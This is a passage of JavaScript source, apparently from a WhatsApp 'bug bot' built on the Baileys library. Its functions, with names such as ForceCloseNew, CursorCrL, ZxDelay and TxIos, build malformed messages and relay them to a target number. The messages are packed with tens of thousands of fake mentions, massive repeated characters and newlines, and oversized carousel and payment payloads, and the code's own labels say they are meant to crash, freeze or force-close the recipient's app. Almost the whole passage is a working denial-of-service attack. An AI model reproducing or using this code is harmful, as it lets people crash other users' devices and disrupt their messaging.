                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }, 
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }
    ];

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: bodyText },
                    carouselMessage: {
                        cards,
                        messageVersion: 1
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        participant: { jid: jid },
        messageId: msg.key.id,
    });
}

async function protocolbug8(sock, jid, mention) {
  const photo = {
    image: anjay,
    caption: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋"
  };

  const album = await generateWAMessageFromContent(jid, {
    albumMessage: {
      expectedImageCount: 100, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: jid,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(jid, album.message, { messageId: album.key.id });

  for (let i = 0; i < 100; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(jid, photo, {
      upload: sock.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(jid, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function RansSuperDelay(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𝐕𝐎𝐈𝐃 𝐒𝐓𝐑𝐎𝐌 Crash" + "ោ៝".repeat(10000),
        title: "ranstech mode terbang",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://youtube.com/@zahranDev",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "R A N S C R A S H E R ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "RansCloudsBug"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function ForceCloseNew(sock, jid) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝐕𝐎𝐈𝐃 𝐒𝐓𝐑𝐎𝐌 ~ bug delay x fc ⛧',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋~ bug delay x fc⛧"
                },
                footer: {
                  text: "Carosuel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Xrl ~ Fuckerr",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
}
async function CursorpCrLX(sock, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡 " + " ".repeat(10000)
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋",
                  imageMessage: {
                    mimetype: "image/jpeg",
                    height: 1,
                    width: 1,
                    mediaKey: "AgAAAAAAAAAAAAAAAAAAAAA=",
                    fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    mediaKeyTimestamp: "999999999",
                    fileLength: "999999",
                    directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
                    jpegThumbnail: Buffer.from("00", "hex"),
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: " ".repeat(5000)
                },
                footer: {
                  text: "carousel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(99999)
                }
              }
            ]
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9999)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      crash: "{ xx.com }".repeat(9999)
                    }),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid }
  });
}
async function CursorCrL(sock, jid) {
  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${jid}`))
}

async function ZxDelay(sock, jid, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
      ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: ".AditZxx" + "ោ៝".repeat(10000),
      title: "LoopingAttack? yes sir",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/xrelly",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
      fileLength: "1515940",
      seconds: 14,
      mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
      height: 1280,
      width: 720,
      fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
      directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1748276788",
      contextInfo: { isSampled: true, mentionedJid: mentionedList },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Λ𐌓ı𐌕 ✦ 𐌍૯𝘷૯𐍂°𐌓ı૯"
      },
      streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
      thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
      thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
      thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
      annotations: [{
        embeddedContent: { embeddedMusic },
        embeddedAction: true
      }]
    };

    const stickerMessage = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        mimetype: "image/webp",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
        fileLength: { low: 1, high: 0, unsigned: true },
        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
        firstFrameLength: 19904,
        firstFrameSidecar: "KN4kQ5pyABRAgA==",
        isAnimated: true,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: mentionedList
        }
      }
    };

    const audioMessage = {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
        fileLength: "389948",
        seconds: 24,
        ptt: false,
        mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
        caption: "Λ𐌓ı𐌕 ✦ 𐌍૯𝘷૯𐍂°𐌓ı૯",
        fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
      }
    };

    const msg1 = generateWAMessageFromContent(jid, {
      viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
      viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { 
                    tag: "to", 
                    attrs: { jid: jid }, 
                    content: undefined
                  }
                ]
              }
            ] 
          }
        ]
      });
    };

    if (mention) {
      await sock.relayMessage(jid, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }
        ]
      }
    );
  }
};

async function TxIos(sock, jid, Ptcp = false) {
			await sock.relayMessage(jid, {
					"extendedTextMessage": {
						"text": "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "13135550002@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "13135550002@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": jid,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "13135559098@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋",
								"body": "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 Trash-Iosϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
